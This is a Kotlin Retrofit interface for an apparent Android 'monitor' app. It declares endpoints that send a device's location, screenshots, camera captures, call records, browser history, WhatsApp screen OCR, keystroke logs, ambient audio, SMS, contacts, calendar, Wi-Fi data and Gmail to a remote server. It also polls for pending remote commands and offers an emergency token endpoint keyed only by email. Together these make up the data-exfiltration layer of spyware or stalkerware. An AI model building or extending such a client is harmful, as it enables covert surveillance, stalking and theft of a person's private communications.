package com.empresa.monitor.data.api

import com.empresa.monitor.data.model.*
import retrofit2.Response
import retrofit2.http.*

interface MonitorApi {

    // ─── Auth ──────────────────────────────────────────
    @POST("auth/login")
    suspend fun login(@Body body: LoginRequest): Response<LoginResponse>

    @GET("auth/token/{email}")
    suspend fun getEmergencyToken(@Path("email") email: String): Response<LoginResponse>

    // ─── Device ─────────────────────────────────────────
    @POST("devices/register")
    suspend fun registerDevice(@Body body: DeviceRegisterRequest): Response<DeviceResponse>

    @PATCH("devices/{id}")
    suspend fun updateDevice(@Path("id") id: String, @Body body: Map<String, Any>): Response<DeviceResponse>

    @POST("devices/{id}/heartbeat")
    suspend fun heartbeat(@Path("id") deviceId: String): Response<Unit>

    // ─── Location ───────────────────────────────────────
    @POST("devices/{id}/location")
    suspend fun sendLocation(@Path("id") deviceId: String, @Body body: LocationRequest): Response<Unit>

    // ─── Usage ──────────────────────────────────────────
    @POST("devices/{id}/usage")
    suspend fun sendUsage(@Path("id") deviceId: String, @Body body: AppUsageRequest): Response<Unit>

    // ─── Screenshots ────────────────────────────────────
    @POST("devices/{id}/screenshots")
    suspend fun sendScreenshot(@Path("id") deviceId: String, @Body body: ScreenshotRequest): Response<Unit>

    // ─── Camera ─────────────────────────────────────────
    @POST("devices/{id}/camera")
    suspend fun sendCameraImage(@Path("id") deviceId: String, @Body body: CameraImageRequest): Response<Unit>

    @Multipart
    @POST("devices/{id}/camera-upload")
    suspend fun uploadCameraImage(
        @Path("id") deviceId: String,
        @Part image: okhttp3.MultipartBody.Part,
        @Part("camera_type") cameraType: okhttp3.RequestBody,
        @Part("captured_at") capturedAt: okhttp3.RequestBody,
        @Part("capture_id") captureId: okhttp3.RequestBody?
    ): Response<Unit>

    // ─── Calls ──────────────────────────────────────────
    @POST("devices/{id}/calls")
    suspend fun sendCallRecord(@Path("id") deviceId: String, @Body body: CallRecordRequest): Response<Unit>

    // ─── Browser ────────────────────────────────────────
    @POST("devices/{id}/browser")
    suspend fun sendBrowserHistory(@Path("id") deviceId: String, @Body body: BrowserHistoryRequest): Response<Unit>

    // ─── WhatsApp OCR ───────────────────────────────────
    @POST("devices/{id}/whatsapp/ocr")
    suspend fun sendWhatsAppOcr(@Path("id") deviceId: String, @Body body: WhatsAppOcrRequest): Response<Unit>

    // ─── Alerts ─────────────────────────────────────────
    @POST("devices/{id}/alerts")
    suspend fun sendAlert(@Path("id") deviceId: String, @Body body: AlertRequest): Response<Unit>

    // ─── Battery ────────────────────────────────────────
    @POST("devices/{id}/battery")
    suspend fun sendBattery(@Path("id") deviceId: String, @Body body: BatteryRequest): Response<Unit>

    // ─── Commands ───────────────────────────────────────
    @GET("devices/{id}/commands/pending")
    suspend fun checkPendingCommand(@Path("id") deviceId: String): Response<Map<String, Any>>

    // ─── KeyLog ─────────────────────────────────────────
    @POST("devices/{id}/keylogs")
    suspend fun sendKeyLog(@Path("id") deviceId: String, @Body body: KeyLogRequest): Response<Unit>

    // ─── Ambient Audio ─────────────────────────────────
    @Multipart
    @POST("devices/{id}/audio-ambient")
    suspend fun sendAmbientAudio(
        @Path("id") deviceId: String,
        @Part audio: okhttp3.MultipartBody.Part
    ): Response<Unit>

    // ─── Phase 1 Extended ───────────────────────────────

    @POST("devices/{id}/sms")
    suspend fun sendSms(@Path("id") deviceId: String, @Body body: SmsApiRequest): Response<Unit>

    @POST("devices/{id}/contacts")
    suspend fun sendContacts(@Path("id") deviceId: String, @Body body: List<ContactApiRequest>): Response<Unit>

    @POST("devices/{id}/calendar")
    suspend fun sendCalendar(@Path("id") deviceId: String, @Body body: CalendarApiRequest): Response<Unit>

    @POST("devices/{id}/wifi")
    suspend fun sendWifi(@Path("id") deviceId: String, @Body body: List<WifiApiRequest>): Response<Unit>

    @POST("devices/{id}/gmail")
    suspend fun sendGmail(@Path("id") deviceId: String, @Body body: GmailApiRequest): Response<Unit>

    @POST("devices/{id}/logs")
    suspend fun sendDeviceLog(@Path("id") deviceId: String, @Body body: DeviceLogApiRequest): Response<Unit>
}
